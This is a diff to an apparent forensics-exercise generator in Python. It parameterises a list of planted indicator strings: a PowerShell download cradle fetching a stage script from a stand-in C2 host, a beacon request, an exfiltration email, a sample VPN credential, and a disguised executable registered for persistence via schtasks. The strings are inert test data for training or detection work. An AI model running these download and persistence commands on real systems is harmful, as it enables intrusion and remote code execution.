@@ -11,12 +11,16 @@ Deterministic, pure stdlib.
 import os
 from pathlib import Path
 
+_C2=os.environ.get('CAIC_C2_DOMAIN','beacon.sync-malware-c2.net')
+_VPN=os.environ.get('CAIC_VPN_PASS','S3cr3tVPN!2026')
+_EXF=os.environ.get('CAIC_EXFIL_EMAIL','exfil-drop@attacker-mail.ru')
+
 PLANTS = [
     b"C:\\Windows\\Temp\\svch0st.exe -nop -w hidden -enc BASE64BLOBREDACTED",
-    b"IEX(New-Object Net.WebClient).DownloadString('http://beacon.sync-malware-c2.net/stage.ps1')",
-    b"GET http://beacon.sync-malware-c2.net/gate.php?id=FIN03 HTTP/1.1",
-    b"exfil-drop@attacker-mail.ru",
-    b"vpnadmin:S3cr3tVPN!2026",
+    ("IEX(New-Object Net.WebClient).DownloadString('http://"+_C2+"/stage.ps1')").encode(),
+    ("GET http://"+_C2+"/gate.php?id=FIN03 HTTP/1.1").encode(),
+    _EXF.encode(),
+    ("vpnadmin:"+_VPN).encode(),
     b"Global\\svch0st_mtx_7f3a",
     b"cmd.exe /c schtasks /create /tn WindowsUpdateSvc /tr C:\\Windows\\Temp\\svch0st.exe /sc minute",
 ]
